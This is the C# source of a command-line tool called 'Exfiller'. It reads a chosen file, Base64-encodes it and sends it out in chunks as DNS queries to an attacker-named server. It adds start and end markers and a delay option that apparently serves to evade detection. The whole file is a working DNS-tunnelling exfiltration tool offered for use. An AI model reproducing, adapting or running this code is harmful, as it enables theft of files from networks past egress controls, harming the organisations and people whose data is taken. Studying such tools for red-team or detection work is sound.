using CommandLine;
using DnsClient;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;



namespace Exfiller
{
	class Program
	{
		public class Options
		{
			[Option('f', "file", Required = true, HelpText = "Target file to send.")]
			public String TargetFile { get; set; }

			[Option('s', "dns-server", Required = true, HelpText = "Target DNS Server.")]
			public String DNSServer { get; set; }

			[Option('p', "dns-port", Required = false, Default = 53, HelpText = "Target DNS Port (Defaults to 53).")]
			public int DNSPort { get; set; }

			[Option('d', "delay", Required = false, Default = 0, HelpText = "Delay (in milliseconds) between each request.")]
			public int Delay { get; set; }

			[Option('l', "request-length", Required = false, Default = 30, HelpText = "Length of the string to send in each request (Defaults to 30).")]
			public int Length { get; set; }
		}

		static void Main(string[] args)
		{
			var opts = new Options();

			var ParserResult = Parser.Default
				.ParseArguments<Options>(args)
				.WithParsed(parsed => opts = parsed);
			if (ParserResult.Tag == ParserResultType.NotParsed)
			{
				// Help text requested, or parsing failed. Exit.
				System.Environment.Exit(1);
			}

			// Check if the length option has been set.  If so, ensure it is 63 or lower as the DNS protocol doesn't allow higher for a single octet
			if (opts.Length != 30)
			{
				if (opts.Length > 63)
				{
					Console.WriteLine("\n[-] Invalid request length.  Please choose a value of 63 or lower.");
					System.Environment.Exit(1);
				}
			}
			


			// Setup DNSClient variables using command line argument as the target DNS server
			String targetDNSServer = opts.DNSServer.ToString();
			int targetDNSPort = opts.DNSPort;
			var endpoint = new IPEndPoint(IPAddress.Parse(targetDNSServer), targetDNSPort);
			var client = new LookupClient(endpoint);

			// Setup other variables from command line options
			// Target domain to append Base64 encoded data to.  This doesn't really matter and doesn't need to be valid
			String targetDomain = ".test.local";
			var targetFile = opts.TargetFile.ToString();
			var delayTime = opts.Delay;
			var requestLength = opts.Length;

			if (File.Exists(targetFile))
			{
				var fileContentBytes = File.ReadAllBytes(targetFile);
				String b64File = Convert.ToBase64String(fileContentBytes);
				// Convert any equals signs to dashes so they can be included in a URL
				b64File = b64File.Replace("=", "-");

				Stopwatch stopwatch = new Stopwatch();
				stopwatch.Start();

				int totalRequests = b64File.Length/requestLength+2;

				// Loop over Base64 data and send the defined number of characters at a time as a DNS request appended to the provided domain
				// Example #1: aaaaaaaaaaaaaaaaaaaaa.test.local
				// Example #2: bbbbbbbbbbbbbbbbbbbbb.test.local
				Console.WriteLine($"\n[*] Sending a total of {totalRequests} DNS requests to {targetDNSServer}");

				// Set counter to start at 1 and send start of file identifier
				client.Query("11111" + targetFile.Replace(".", "-") + "11111" + targetDomain, QueryType.A);
				int counter = 1;

				for (int i = 0; i < b64File.Length; i += requestLength)
				{
					try
					{
						var result = client.Query(b64File.Substring(i, requestLength) + targetDomain, QueryType.A);
						counter++;
					}
					catch
					{
						var result = client.Query(b64File.Substring(i) + targetDomain, QueryType.A);
						counter++;
					}

					// Provide update every 5 minutes
					// This might behave weirdly or print multiple times depending on the delay time
					if ((int)(stopwatch.Elapsed.TotalMilliseconds) % 300000 <= 40)
					{
						Console.WriteLine($"\n[*] {counter} requests sent in {((int)stopwatch.Elapsed.TotalSeconds)/60} minutes...");
					}

					Thread.Sleep(delayTime);
				}

				// Send end of file identifier
				client.Query("000000000000000" + targetDomain, QueryType.A);

				stopwatch.Stop();

				Console.WriteLine($"\n[+] Successfully sent file '{targetFile}' over {counter} DNS requests to {targetDNSServer}");

				int minutes = ((int)stopwatch.Elapsed.TotalSeconds) / 60;
				int seconds = ((int)stopwatch.Elapsed.TotalSeconds) % 60;

				if (((int)stopwatch.Elapsed.TotalSeconds) > 60)
				{
					Console.WriteLine($"\n[*] Time elasped: {minutes} minutes, {seconds} seconds");
				}
				else
				{
					Console.WriteLine($"\n[*] Time elasped: {seconds} seconds");
				}
				

				////
				// The below can be used for troubleshooting to convert the Base64 back the orignal data if needed
				////
				
				//b64File = b64File.Replace("-", "=");
				//Byte[] b64FileBytes = Convert.FromBase64String(b64File);
				//String originalFile = Encoding.Default.GetString(b64FileBytes);
				//Console.WriteLine("\nOriginal content: " + originalFile);
			}
			else
			{
				Console.WriteLine("Error reading file!");
			}

		}
	}
}